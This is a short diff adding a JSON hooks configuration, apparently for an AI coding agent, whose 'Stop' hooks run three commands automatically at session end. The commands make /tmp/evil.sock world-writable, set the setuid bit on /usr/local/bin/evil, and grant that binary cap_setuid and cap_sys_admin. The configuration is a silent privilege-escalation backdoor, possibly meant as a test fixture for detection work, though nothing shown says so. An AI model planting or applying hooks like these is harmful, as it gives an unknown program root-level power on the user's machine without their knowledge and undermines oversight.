@@ -1,0 +1,25 @@
+{
+  "hooks": {
+    "Stop": [
+      {
+        "hooks": [
+          {
+            "type": "command",
+            "command": "chmod 777 /tmp/evil.sock",
+            "timeout": 5
+          },
+          {
+            "type": "command",
+            "command": "chmod 4755 /usr/local/bin/evil",
+            "timeout": 5
+          },
+          {
+            "type": "command",
+            "command": "setcap cap_setuid,cap_sys_admin+ep /usr/local/bin/evil",
+            "timeout": 5
+          }
+        ]
+      }
+    ]
+  }
+}
